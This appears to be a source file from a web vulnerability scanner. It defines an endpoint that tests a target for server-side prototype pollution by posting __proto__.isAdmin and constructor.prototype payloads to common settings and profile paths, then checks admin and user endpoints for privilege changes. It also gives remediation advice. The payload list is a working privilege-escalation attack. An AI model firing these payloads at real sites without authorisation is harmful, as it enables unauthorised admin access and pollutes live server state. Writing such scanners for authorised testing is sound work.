"""proto_pollution_chain — prototype pollution + downstream-sink chain.

Existing prototype_pollution scanner tests Object.prototype mutation via
POST body. This one tests the WHOLE chain: pollute __proto__.isAdmin = true,
then check if subsequent endpoint behavior changes (admin-page access,
extra fields in response).

Two-phase: (1) POST polluting payload to mutation-friendly endpoint,
(2) GET a check-endpoint with same session and look for behavior change.
"""
import json
from concurrent.futures import ThreadPoolExecutor
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_request, wrap_finding, standard_response)
from tools._vl_core.turbo import vl_turbo
from tools._vl_core.verify import vl_verify

router = APIRouter()

POLLUTION_PAYLOADS = [
    {"__proto__": {"isAdmin": True, "polluted": "vulnuslab"}},
    {"constructor": {"prototype": {"polluted": "vulnuslab"}}},
    {"__proto__[isAdmin]": True, "__proto__[polluted]": "vulnuslab"},
]
POST_PATHS = ["/api/user/settings", "/api/settings", "/api/profile",
               "/api/users", "/api/preferences"]
CHECK_PATHS = ["/api/me", "/api/user", "/api/profile",
                "/api/admin/users", "/admin"]


def _post(url, body, req):
    return safe_request("POST", url,
        headers={"Content-Type": "application/json",
                  "User-Agent": "VulnusLab/1.0"},
        data=json.dumps(body), req=req, timeout=8, allow_redirects=False)


def _get(url, req):
    return safe_request("GET", url,
        headers={"User-Agent": "VulnusLab/1.0"},
        req=req, timeout=8, allow_redirects=False)


@router.post("/api/webapp/scan/proto_pollution_chain")
@vl_turbo()
@vl_verify()
def scan_proto_pollution_chain(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")

    # VL-TURBO deep: Phase 0 — fetch all 5 check-path baselines in parallel.
    # Was 5 sequential GETs at 8s = ~40s worst case. Now ~8s.
    def _baseline(p):
        r = _get(base + p, req)
        if r is None or r.status_code == 404:
            return None
        return (p, {"status": r.status_code,
                     "body_snippet": (r.text or "")[:1000]})

    baselines = {}
    with ThreadPoolExecutor(max_workers=5) as pool:
        for res in pool.map(_baseline, CHECK_PATHS, timeout=15):
            if res is not None:
                baselines[res[0]] = res[1]

    if not baselines:
        return standard_response(
            tool="proto_pollution_chain", target=req.target, findings=[],
            tests_performed=len(CHECK_PATHS), vulnerable=False,
            skipped_reason="No check endpoints exist on target")

    # Phase 1: parallel sanity-check all POST paths
    def _sanity(p):
        r = _get(base + p, req)
        if r is None or r.status_code == 404:
            return None
        return p

    valid_post_paths = []
    with ThreadPoolExecutor(max_workers=5) as pool:
        for res in pool.map(_sanity, POST_PATHS, timeout=15):
            if res is not None:
                valid_post_paths.append(res)

    post_tested = len(valid_post_paths)

    # Phase 2: parallelize POST-then-check pollution probes.
    # Each (post_path, payload) pair: 1 POST + N GET re-checks sequentially
    # (re-checks need to follow the POST). Pairs run in parallel pool.
    def _probe(job):
        post_path, payload_body = job
        post_url = base + post_path
        _post(post_url, payload_body, req)  # ignore result
        for check_path, base_data in baselines.items():
            r = _get(base + check_path, req)
            if r is None:
                continue
            if (r.status_code == 200 and base_data["status"] in (401, 403)) or \
               ("polluted" in (r.text or "")[:5000]):
                return {
                    "post_path": post_path,
                    "check_path": check_path,
                    "baseline_status": base_data["status"],
                    "polluted_status": r.status_code,
                    "marker_reflected": "polluted" in (r.text or "")[:5000],
                }
        return None

    jobs = [(p, pl) for p in valid_post_paths for pl in POLLUTION_PAYLOADS]
    chain_hits = []
    seen_post_paths = set()
    if jobs:
        with ThreadPoolExecutor(max_workers=min(10, len(jobs))) as pool:
            for hit in pool.map(_probe, jobs, timeout=60):
                if hit is None:
                    continue
                if hit["post_path"] in seen_post_paths:
                    continue
                chain_hits.append(hit)
                seen_post_paths.add(hit["post_path"])

    findings = []
    if chain_hits:
        findings.append(wrap_finding(
            f"PROTOTYPE POLLUTION CHAIN confirmed at {len(chain_hits)} location(s)",
            "CRITICAL", cvss="9.0", cwe="CWE-1321", owasp="A03:2021",
            remediation="Server-side prototype pollution chain to privilege "
                        "escalation. (1) Use Object.create(null) for parsed JSON "
                        "(no __proto__). (2) lodash >= 4.17.21 (fixed CVE-2020-"
                        "8203). (3) Validate request body with schema (Joi / "
                        "Zod / AJV) that rejects __proto__ + constructor keys. "
                        "(4) Audit all server-side merge / extend / defaultsDeep "
                        "callers — these are the typical sinks.",
            evidence_marker=" | ".join(
                f"POST {c['post_path']} → GET {c['check_path']}: "
                f"{c['baseline_status']} → {c['polluted_status']}"
                f"{' + polluted marker' if c['marker_reflected'] else ''}"
                for c in chain_hits[:3]
            )))
    else:
        findings.append(wrap_finding(
            f"No prototype-pollution chain to privilege escalation detected "
            f"({post_tested} mutation paths × {len(POLLUTION_PAYLOADS)} payloads × "
            f"{len(baselines)} check paths)",
            "POSITIVE", cwe="CWE-1321",
            remediation="Maintain. Continue using object freeze / schema validation.",
            evidence_marker=f"baselines: {list(baselines.keys())[:3]}"))

    return standard_response(
        tool="proto_pollution_chain", target=req.target, findings=findings,
        tests_performed=post_tested * len(POLLUTION_PAYLOADS) * len(baselines),
        vulnerable=bool(chain_hits),
        tests_summary=f"{post_tested} mutation paths, {len(chain_hits)} chains",
        raw_data={"chain_hits": chain_hits, "baselines": baselines})


def register(app):
    app.include_router(router)
